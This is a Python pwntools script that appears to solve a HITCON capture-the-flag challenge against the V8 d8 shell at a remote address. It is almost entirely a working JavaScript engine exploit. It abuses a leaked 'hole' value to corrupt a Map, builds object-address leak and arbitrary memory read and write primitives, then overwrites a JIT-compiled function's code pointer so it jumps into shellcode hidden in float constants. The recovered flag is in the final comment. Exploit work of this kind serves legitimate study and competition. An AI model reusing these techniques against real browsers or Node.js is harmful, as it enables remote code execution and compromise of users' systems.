#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *
import os

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0

filename = "./d8"
if LOCAL:
    p = process(filename)
else:
    remote_service = "35.227.151.88 30262"
    remote_service = remote_service.strip().split(" ")
    p = remote(remote_service[0], int(remote_service[1]))
#  e = ELF(filename, checksec=False)
#  l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    #  if LOCAL:
        #  lg("p.pid")
        #  input()
    pass

#  debugPID()

irt()

exp = r'''
class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
    }
    cl(f) {
        this.f64[0] = f;
        return this.u32[0]
    }
    ch(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    itof(i) {
        this.u32[0] = i;
        return this.f32[0];
    }
    f2i(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    i2f(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
}
var h = new Helpers();
const f = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	f();f();f();f();
}
let hole = [].hole();
var m = new Map();
m.set(1, 1);
m.set(hole, 1);
m.delete(hole);
m.delete(hole);
m.delete(1);
var ca = new Array(1.1, 1.1);
var ff = [4.3];
var fo = [{}];
m.set(0x10, -1);
m.set(ca, 0xffff);
flproperties = h.ch(ca[7]);
flm = h.cl(ca[7]);
flea = h.cl(ca[8]);
fllength = h.ch(ca[8]);
oproperties = h.cl(ca[14]);
om = h.ch(ca[13]);
oea = h.ch(ca[14]);
olength = h.cl(ca[15]);
function geta( obj ) {
    let bakup1 = h.cl(ca[13]);
    fo[0] = obj;
    ca[13] = h.i2f( (BigInt(flm) << 32n) + BigInt(bakup1) );
    let res = h.cl(fo[0]);
    ca[13] = h.i2f( (BigInt(om) << 32n) + BigInt(bakup1) );
    return res;
}
function wa( addr, data ) {
    ca[8] = h.i2f( (BigInt(fllength) << 0x20n) + BigInt(addr) - 0x8n );
    ff[0] = data;
}
function ra( addr ) {
    ca[8] = h.i2f( (BigInt(fllength) << 0x20n) + BigInt(addr) - 0x8n);
    return h.f2i(ff[0]);
}
let fa  = geta(f);
let codea = ra(fa + 0x18) & 0xffffffffn;
let ea = ra(codea + 0xcn);
wa(codea+0xcn, h.i2f(ea+0x7cn));
f();
'''

#  ru(b'Your javscript file size: ( MAX: 2000 bytes ) ')
sl(i2b(len(exp)))
ru(b'Input your javascript file:')
ru(b'\n')
sn(exp.encode())

irt()

# hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((}
